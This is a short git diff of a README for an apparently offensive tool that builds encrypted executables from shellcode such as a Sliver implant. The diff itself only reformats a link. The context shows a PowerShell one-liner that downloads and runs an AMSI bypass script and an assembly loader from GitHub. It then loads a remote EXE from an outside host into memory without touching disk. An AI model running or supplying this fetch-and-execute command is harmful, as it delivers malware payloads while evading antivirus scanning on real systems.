@@ -76,7 +76,7 @@ rawscfilename='sliver.bin'
 
 4. Run the autogen script, wait for couple of minutes and check the generated encrypted EXE in the output folder.
 
-5. Since the gneerated EXE are Sharp Assembly, so it can be chained with the tool `[PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader)` to load remotely into memory without touch disk, as shown in the following example:
+5. Since the gneerated EXE are Sharp Assembly, so it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));Invoke-LoadAssembly -AssemblyUrl https://not.o0.rs/halosli64x2.exe -Command ""
 ```
